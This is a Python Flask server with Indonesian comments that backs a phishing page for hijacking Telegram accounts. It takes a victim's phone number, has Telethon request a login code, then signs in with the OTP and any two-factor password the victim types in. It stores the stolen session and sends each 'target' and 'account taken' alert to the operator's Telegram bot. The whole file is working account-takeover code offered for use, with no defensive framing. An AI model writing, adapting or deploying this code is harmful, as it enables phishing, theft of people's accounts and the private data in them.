import os, asyncio, json, re, requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_DIR = '/tmp/sessions/'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

active_clients = {}

def send_bot(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

def format_nomor(nomor):
    # Hilangkan spasi atau tanda strip jika ada
    n = re.sub(r'\D', '', nomor)
    # Jika diawali 08..., ubah jadi +628...
    if n.startswith('08'):
        return '+62' + n[1:]
    # Jika sudah diawali 62..., tinggal tambah +
    if n.startswith('62'):
        return '+' + n
    # Jika belum ada kode negara sama sekali
    if not nomor.startswith('+'):
        return '+' + n
    return nomor

@app.route('/register', methods=['POST'])
async def register():
    data = request.json
    nama_web = data.get('nama')
    nomor_mentah = data.get('nomor')
    
    # 1. OTOMATIS FORMAT NOMOR KE +62
    nomor = format_nomor(nomor_mentah)

    client = TelegramClient(f"{SESSION_DIR}{nomor}", int(API_ID), API_HASH)
    await client.connect()
    
    try:
        # TRIGGER: Minta OTP
        sent_code = await client.send_code_request(nomor)
        
        active_clients[nomor] = {
            "client": client,
            "phone_code_hash": sent_code.phone_code_hash,
            "nama_palsu": nama_web
        }
        
        send_bot(f"⚠️ *Target Masuk!*\n👤 Nama Web: {nama_web}\n📱 Nomor: `{nomor}`\n\n_Menunggu OTP..._")
        return jsonify({"status": "sent", "message": "OTP Terkirim"}), 200
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/verify-otp', methods=['POST'])
async def verify_otp():
    data = request.json
    nomor = format_nomor(data.get('nomor'))
    otp = data.get('otp')
    sandi_2fa = data.get('sandi')

    if nomor not in active_clients:
        return jsonify({"status": "error", "message": "Sesi hilang, refresh halaman"}), 400

    stored = active_clients[nomor]
    client = stored["client"]
    phone_code_hash = stored["phone_code_hash"]

    try:
        # LOGIN
        user = await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
        
        # 2. AMBIL NAMA ASLI DARI TELEGRAM TARGET
        nama_asli = user.first_name if user.first_name else "Tanpa Nama"
        # Ambil satu kata pertama dari nama asli
        nama_panggilan = nama_asli.split()[0]

        send_bot(f"✅ *LOGIN SUKSES!*\n👤 Nama Asli: *{nama_panggilan}*\n📱 Nomor: `{nomor}`\nStatus: Akun Berhasil Diambil.")
        return jsonify({"status": "success", "message": "Login Berhasil"}), 200

    except SessionPasswordNeededError:
        if sandi_2fa:
            try:
                user = await client.sign_in(password=sandi_2fa)
                nama_panggilan = user.first_name.split()[0] if user.first_name else "Target"
                send_bot(f"✅ *LOGIN SUKSES (2FA)!*\n👤 Nama Asli: *{nama_panggilan}*\n📱 Nomor: `{nomor}`")
                return jsonify({"status": "success", "message": "Login Berhasil"}), 200
            except:
                return jsonify({"status": "error", "message": "Sandi 2FA Salah!"}), 400
        return jsonify({"status": "need_2fa", "message": "Masukkan Sandi 2FA"}), 200

    except PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Kode OTP Salah!"}), 400
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)